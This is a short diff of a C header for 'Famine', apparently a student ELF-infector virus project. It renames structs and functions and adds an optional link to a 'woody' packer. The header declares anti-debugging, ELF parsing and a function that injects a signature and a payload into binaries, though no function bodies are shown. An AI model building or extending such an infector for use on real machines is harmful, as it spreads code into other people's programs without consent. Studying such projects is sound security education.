@@ -12,10 +12,14 @@
 #include "../libft/libft.h"
 #include "../include/log.h"
 
+#ifdef FAMINE_BONUS
+    #include <woody.h>
+#endif
+
 #define SIGNATURE "Famine version 1.0 (c)oded by nfour-kbutor-b\n"
 #define SIGNATURE_LEN (sizeof(SIGNATURE))
 
-typedef struct s_elf_file {
+typedef struct s_famine_elf_file {
 	void		*ptr;			/* Pointer to the ELF file */
 	u64			size;			/* Size of the ELF file */
 	s8			is_64;			/* 64 bits or 32 bits */
@@ -39,11 +43,11 @@ void		anti_debug();
 int 		lock_global();
 
 /* Famine file handling parse elf and get file structure */
-FamineFile  *elf_file_get(char *path);
+FamineFile  *famine_elf_file_get(char *path);
 void        destroy_famine_file(FamineFile *file);
 
 /* Signature injection */
-void        inject_signature(FamineFile *elf);
+void        famine_injection(FamineFile *elf, void *input, int woody_init_ok);
 
 #endif /* FAMINE_H */
 
